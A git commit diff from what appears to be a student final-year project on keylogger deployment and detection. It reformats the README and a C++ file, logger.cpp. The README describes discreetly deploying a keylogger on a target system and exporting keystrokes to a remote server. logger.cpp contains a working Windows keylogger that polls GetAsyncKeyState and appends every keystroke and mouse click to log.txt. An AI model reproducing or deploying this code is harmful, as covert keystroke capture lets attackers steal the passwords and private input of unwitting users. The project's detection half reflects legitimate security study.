e36d0dea0d879f7154864caa985a7dbf4992c392
bleak-alpha <71189549+bleak-alpha@users.noreply.github.com>
2023-01-03 01:23:25 +0530

    Changes to be committed: 	modified:   README.md 	modified:   logger.cpp

--- README.md
+++ README.md
@@ -4,53 +4,52 @@ Final Year Project based upon working and exploitation of keylogger software
 ## Table of Contents
 
 - [About](#about)
-- [Progress Report](#progess)
+- [Progress Report](#progress)
 
 
 ## About <a name = "about"></a>
 
 #### This project works on two fronts:
-#####       1. Keylogger Deployment-
-                    Deploys a keylogger discretly within the target system and logs the keystrokes in logfile or exports them to a remote server
+##### 1. Keylogger Deployment-
+Deploys a keylogger discretly within the target system and logs the keystrokes in logfile or exports them to a remote server
             
-#####       2. Keylogger Detection-
-                    Detects keylogger by doing memory consumption analysis and outputs potential keylogger proccesses
+##### 2. Keylogger Detection-
+Detects keylogger by doing memory consumption analysis and outputs potential keylogger proccesses
 
 
 ## Progress Report <a name = "progress"></a>
 
 #### Dev Notes:
-        -> WinLogger function works only fow windows system
+-> WinLogger() logs keystrokes into an external log file (log.txt)
 
 
 #### To Do:
-        ->Detect Special Keys in WinLogger()
-            -[ESC]
-            -[WIN]
-            -[SPACE]
-            -[INS]
-            -[DEL]
-            -[END]
-            -[PGUP]
-            -[PGDW]
-            -[PRTSCR]
-            -[SCRLK]
-            -[PAUBRK]
-            -[SCRDW]
-            ~~-[ALT]~~
-            ~~-[ENTER]~~
-            ~~-[BACKSPACE]~~
-            ~~-[LTCLK]~~
-            ~~-[RTCLK]~~
-            ~~-[SCRUP]~~
-            ~~-[TAB]~~
-            ~~-[CAPS]~~
-            ~~-[SHIFT]~~
-            ~~-[CTRL]~~
-            
-        
-        ->Create LinLogger() for linux
+->Detect Special Keys in WinLogger()
+-[ESC]
+-[WIN]
+-[SPACE]
+-[INS]
+-[DEL]
+-[END]
+-[PGUP]
+-[PGDW]
+-[PRTSCR]
+-[SCRLK]
+-[PAUBRK]
+-[SCRDW]
+~~-[ALT]~~
+~~-[ENTER]~~
+~~-[BACKSPACE]~~
+~~-[LTCLK]~~
+~~-[RTCLK]~~
+~~-[SCRUP]~~
+~~-[TAB]~~
+~~-[CAPS]~~
+~~-[SHIFT]~~
+~~-[CTRL]~~
+                   
+->Create LinLogger() for linux
 
 
 #### Bugs:
-        ~~-> Double alphanumeric input detected in WinLogger()~~
+~~-> Double alphanumeric input detected in WinLogger()~~
--- logger.cpp
+++ logger.cpp
@@ -7,59 +7,48 @@ using namespace std;
 
 void WinLogging();
 
-int main()
-{
+int main() {
     WinLogging();
 }
 
-void WinLogging()
-{
-    while (true)
-    {
-        for (char c = 0; c <= 254; c++)
-        {
-            if (GetAsyncKeyState(c) & 0x1)
-            { // comparing last bit from both using AND
+void WinLogging() {
+    while (true) {   
+        for (char c = 0; c <= 254; c++) {
+            if (GetAsyncKeyState(c) & 0x1) { // comparing last bit from both using AND
                 ofstream log;
-                log.open("log.txt", ios::app); // stores o/p in the log file
+                log.open("log.txt", ios::app); // exporting o/p to log.txt
 
-                switch (c)
-                { // for non-alphanumeric keys
-                case VK_BACK:
-                    log << "[backspace]";
-                    break;
-                case VK_RETURN:
-                    log << "[enter]";
-                    break;
-                case VK_SHIFT:
-                    log << "[shift]";
-                    break;
-                case VK_CONTROL:
-                    log << "[control]";
-                    break;
-                case VK_CAPITAL:
-                    log << "[cap]";
-                    break;
-                case VK_TAB:
-                    log << "[tab]";
-                    break;
-                case VK_MENU:
-                    log << "[alt]";
-                case VK_LBUTTON:
-                    log << "[LB]";
-                    break;
-                case VK_RBUTTON:
-                    log << "RB";
-                    break;
-                default:
-                    log << c;
+                switch (c) { // for non-alphanumeric keys
+                    case VK_BACK:
+                        log << "[backspace]";
+                        break;
+                    case VK_RETURN:
+                        log << "[enter]";
+                        break;
+                    case VK_SHIFT:
+                        log << "[shift]";
+                        break;
+                    case VK_CONTROL:
+                        log << "[control]";
+                        break;
+                    case VK_CAPITAL:
+                        log << "[cap]";
+                        break;
+                    case VK_TAB:
+                        log << "[tab]";
+                        break;
+                    case VK_MENU:
+                        log << "[alt]";
+                    case VK_LBUTTON:
+                        log << "[LB]";
+                        break;
+                    case VK_RBUTTON:
+                        log << "[RB]";
+                        break;
+                    default:
+                        log << c;
                 }
-                // cout<<c;
             }
         }
     }
 }
-// Dev note: WinLogging works only for windows system,
-//   bug report:                                            To Do:
-//       -> double alphanumeric input [Solved]                  -> Detect Special Keys
-//
